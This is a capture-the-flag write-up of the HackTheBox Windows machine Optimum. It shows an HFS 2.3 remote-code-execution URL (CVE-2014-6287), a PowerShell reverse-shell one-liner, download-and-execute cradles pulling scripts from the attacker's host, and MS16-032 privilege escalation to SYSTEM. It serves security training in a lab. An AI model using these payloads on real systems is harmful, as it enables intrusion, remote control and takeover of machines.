---
title: HTB: Optimum
url: https://0xdf.gitlab.io/2021/03/17/htb-optimum.html
date: 2021-03-17T09:00:00+00:00
difficulty: Easy [20]
os: Windows
tags: hackthebox, htb-optimum, ctf, nmap, windows, httpfileserver, hfs, searchsploit, cve-2014-6287, nishang, winpeas, watson, sherlock, process-architechure, ms16-032, cve-2016-0099, htb-bounty, oscp-like-v1
---

![Optimum](https://0xdfimages.gitlab.io/img/optimum-cover.png)

Optimum was sixth box on HTB, a Windows host with two CVEs to exploit. The first is a remote code execution vulnerability in the HttpFileServer software. I’ll use that to get a shell. For privesc, I’ll look at unpatched kernel vulnerabilities. Today to enumerate these I’d use Watson (which is also built into winPEAS), but getting the new version to work on this old box is actually challenging, so I’ll use Sherlock (a predecessor to Watson) to identify these vulnerabilities. I got hung up for a bit not realizing my shell was running in a 32-bit process, causing my kernel exploits to fail. I’ll show some analysis of that as well.

## Box Info

| Name | [Optimum](https://hackthebox.com/machines/optimum)  [Optimum](https://hackthebox.com/machines/optimum) [Play on HackTheBox](https://hackthebox.com/machines/optimum) |
| --- | --- |
| Release Date | 18 Mar 2017 |
| Retire Date | 28 Oct 2017 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Optimum |
| Radar Graph | Radar chart for Optimum |
| First Blood User | 17 days11:48:44[adxn37 adxn37](https://app.hackthebox.com/users/32) |
| First Blood Root | 18 days06:34:38[admin admin](https://app.hackthebox.com/users/52) |
| Creator | [ch4p ch4p](https://app.hackthebox.com/users/1) |

## Recon

### nmap

`nmap` found only one open TCP port, HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.8
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-13 21:58 EST
Nmap scan report for 10.10.10.8
Host is up (0.031s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds
oxdf@parrot$ nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.10.8
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-13 21:59 EST
Nmap scan report for 10.10.10.8
Host is up (0.023s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.29 seconds

```

`nmap` identifies the host as Windows, but the HTTP server doesn’t look like IIS, so it’s hard to get an OS version from it.

### Website - TCP 80

#### Site

The website is just what the `nmap` scripts identified - HttpFileServer (HFS):

![image-20210313160126963](https://0xdfimages.gitlab.io/img/image-20210313160126963.png)

I tried some basic cred guessing, but no luck.

#### Vulnerabilities

The bottom of the page gives the exact version of HFS running, 2.3. `searchsploit` has a bug for this version:

```

oxdf@parrot$ searchsploit httpfileserver
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command | windows/webapps/49125.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results

```

This vulnerability is know as [CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287).

## Shell as kostas

### Exploit Analysis

Using `searchsploit -x windows/webapps/49125.py` to look at the exploit, it’s incredibly straight forward:

```

#!/usr/bin/python3

# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"

import urllib3
import sys
import urllib.parse

try:
        http = urllib3.PoolManager()    
        url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'
        print(url)
        response = http.request('GET', url)
        
except Exception as ex:
        print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command")
        print(ex)

```

In Python, `{}` in a f-string (notice the url is wrapped in `f' '`) represent variables, so the `{{` and `}}` are how you escape to write actual curly brackets. So this is just a single HTTP request to `/?search={.+exec|[url-encoded command].}` to get RCE.

```

http://10.10.10.8/?search=%00{.+exec|C%3A%5Cwindows%5Csystem32%5Ccmd.exe%20/c%20ping%2010.10.14.10.}

```

Or URL decoded:

```

http://10.10.10.8/?search=%00{.+exec|c:\windows\system32\cmd.exe+/c+ping+-c+1+10.10.14.10.}

```

### POC

As a proof of concept, I crafted this URL to try to ping myself:

```

http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.14.10.}

```

If it works, I should see a single ICMP packet at my host. I started `tcpdump` and submitted, and nothing.

Often, this can be an issue with the system not finding the path to `ping` in this current environment. So I tried adding `cmd /c` before the command:

```

http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.14.10.}

```

It worked (interestingly four times):

```

oxdf@parrot$ sudo tcpdump -i tun0 icmp and src 10.10.10.8
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:16:51.416240 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 117, length 40
16:16:51.416294 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 118, length 40
16:16:51.416309 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 119, length 40
16:16:51.418739 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 120, length 40

```

I can also run it with PowerShell:

```

http://10.10.10.8/?search=%00{.+exec|powershell.exe+/c+ping+-n+1+10.10.14.10.}

```

### Shell

Given the age of this host and the easy rating, I likely don’t have to worry about Defender / AMSI, so I’ll grab a PowerShell script from [Nishang](https://github.com/samratashok/nishang). I’ll copy the `Invoke-PowerShellTcpOneLine.ps1`, cut the comments, and update the IP and port:

```

$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

I’ll save a copy of that as `rev.ps1` (just to make an easier url I’m about to request). Then I’ll start a Python web server, and visit:

```

http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1').}

```

That triggers Optimum to reach out and download `rev.ps1` (interestingly again four times), which shows up at the web server:

```

oxdf@parrot$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.8 - - [13/Mar/2021 20:38:04] "GET /rev.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [13/Mar/2021 20:38:04] "GET /rev.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [13/Mar/2021 20:38:04] "GET /rev.ps1 HTTP/1.1" 200 -
10.10.10.8 - - [13/Mar/2021 20:38:04] "GET /rev.ps1 HTTP/1.1" 200 -

```

When the file is returned, it is executed by `IEX`, short for `Invoke-Expression`, and the shell connects back to my listening `nc` (for some reason on this shell the prompt only shows up after the first command):

```

oxdf@parrot$ sudo rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.8] 49179
whoami
optimum\kostas
PS C:\Users\kostas\Desktop>

```

There’s a small typo in the flag name, but I can grab it:

```

PS C:\Users\kostas\Desktop> cat user.txt.txt
d0c39409d7b994a9a1389ebf38ef5f73

```

## Shell as SYSTEM

### Enumeration - winPEAS

I started with [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) to look for escalation paths. I cloned a copy of the repo to my host, started an SMB server in the path with the Windows exe with `sudo smbserver.py share . -smb2support`, and copied it to Optimum:

```

PS C:\programdata> copy \\10.10.14.10\share\winPEAS.exe . 

```

Now I’ll run it with `.\winPEAS.exe`. Scanning through the output, there were a few interesting things.

The box is Windows Server 2012 R2, and 64-bit:

```

    Hostname: optimum                               
    ProductName: Windows Server 2012 R2 Standard
    EditionID: ServerStandard                       
    ReleaseId:                                      
    BuildBranch:                                    
    CurrentMajorVersionNumber:                      
    CurrentVersion: 6.3                             
    Architecture: AMD64

```

There were creds for kostas:

```

  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found!!
    DefaultUserName               :  kostas
    DefaultPassword               :  kdeEjDowkS*    

```

A bunch of services were called out as potentially interesting, but nothing in there really panned out.

### Enumeration - Watson/Sherlock

One thing I noticed was not in the winPEAS output was [Watson](https://github.com/rasta-mouse/Watson) results. Watson is a quick checker for CVEs this Windows host might be vulnerable to, and in the original HTB days, that was a common escalation technique (in fact, it is the intended path on this host). My best guess as to why it didn’t run is the .NET version required by Watson in winPEAS is 4.5, and this host only has up to 4.0:

```

PS C:\windows\microsoft.net\framework> ls

    Directory: C:\windows\microsoft.net\framework

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----         22/8/2013   6:39 ??            v1.0.3705
d----         22/8/2013   6:39 ??            v1.1.4322
d----         22/8/2013   6:39 ??            v2.0.50727
d----         20/3/2021   8:06 ??            v4.0.30319
...[snip]...

```

If I want to run Watson, I think I could get it to work by downloading it and compiling it to match one of the .NET versions on the box, but I wasn’t able to get it working quickly. Instead, because this box is so old, I went to Watson’s predecessor, [Sherlock](https://github.com/rasta-mouse/Sherlock). I showed both Sherlock and Watson in the writeup of [Bounty](/2018/10/27/htb-bounty.html#enumeration) 2.5 years ago.

Sherlock is a PowerShell script. I’ll download a copy, and see that it defines a bunch of functions, but doesn’t call any. I’ll add a line at the end to call `Find-AllVulns`. Then I’ll use a Python HTTP server to host a copy, and execute it the same way I got a shell:

```

PS C:\> IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.10/Sherlock.ps1')
                                                    
Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015              
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092                       
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable
                                                    
Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053                     
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems
                                                    
Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081                   
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems
                                                    
Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable

```

There are three that show “Appears Vulnerable”, MS16-032, MS16-034, and MS16-135.

### The Importance of Architecture

I spent a while trying to get these exploits to work, and where they should work, they just didn’t. Then I remembered the importance of knowing the process architecture for the running PowerShell process.

Just calling `powershell` to activate the shell returns a process that is running as a 32-bit process:

```

PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
False

```

That is because the HFS process is likely running as a 32-bit process. This table (stolen from [ss64.com](https://ss64.com/nt/syntax-64bit.html)) shows how the different paths work based on the current session architecture:

![image-20210314142131188](https://0xdfimages.gitlab.io/img/image-20210314142131188.png)

So from within a 32-bit session, calling PowerShell from the `C:\windows\system32` path will give the 32-bit version. Being in a 32-bit session trying to run kernel exploits against a 64-bit OS will fail.

To get a 64-bit shell, I’ll use the full path to PowerShell in the `sysNative` directory:

```

GET /?search=%00{.exec|C%3a\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1').} HTTP/1.1
Host: 10.10.10.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: HFS_SID=0.916518518235534
Upgrade-Insecure-Requests: 1

```

The resulting shell is 64-bit:

```

PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
True

```

### MS16-032

The exploit-db link above will not work for this kind of scenario, as it will pop a new window on the box, rather than giving me the ability to run a command. Luckily, the folks in the Empire project ported a [version of this script](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) to add a command option.

I’ll download a copy of that, and add a line at the end to call it with a command to download and execute my reverse shell:

```

Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1')"

```

From the 64-bit shell, (and with both a Python web server serving `rev.ps1` and `nc` listening on 443 to get the shell), I’ll use the same PowerShell cradle to download and execute the exploit:

```

PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.10/Invoke-MS16032.ps1')
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!

```

There’s a request right away for `Invoke-MS16032.ps1`. Once that last message pops, there’s another request for `rev.ps1`, and then a shell at `nc`:

```

oxdf@parrot$ sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.8] 49244
whoami
nt authority\system
PS C:\Users\kostas\Desktop>

```

And I can grab `root.txt`:

```

PS C:\users\administrator\desktop> type root.txt
51ed1b36************************

```